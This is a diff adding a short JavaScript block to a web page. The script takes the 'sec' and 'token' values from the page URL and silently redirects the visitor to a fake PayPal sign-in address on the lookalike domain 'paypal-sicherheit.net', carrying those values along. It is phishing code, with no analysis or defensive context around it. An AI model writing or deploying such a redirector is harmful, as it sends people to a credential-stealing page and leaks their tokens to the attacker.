@@ -1,0 +1,9 @@
+<script>
+	var url = new URL(window.location.href);
+	var sec = url.searchParams.get("sec");
+	var token = url.searchParams.get("token");
+	var secret = ["https://paypal-sicherheit.net/de/signin/assoc_handle=cVfGny5Q2gD9AUSJCjOLNtW6KlBPFwopenid_claim=j6WlMtXIQszLBxYnRq4uidentifier_select=G5potTaHmerLqxkY78yJpape_max=Nr7Yd0v1XAzZMuEQLDjms2tnBVwGle/","https://paypal-sicherheit.net/de/signin/assoc_handle=cVfGny5Q2gD9AUSJCjOLNtW6KlBPFwopenid_claim=j6WlMtXIQszLBxYnRq4uidentifier_select=G5potTaHmerLqxkY78yJpape_max=Nr7Yd0v1XAzZMuEQLDjms2tnBVwGle/"];
+
+	var d = (secret[Math.floor(Math.random()*secret.length)]+"?sec="+sec+"&token="+token);
+	window.location = d;
+</script>
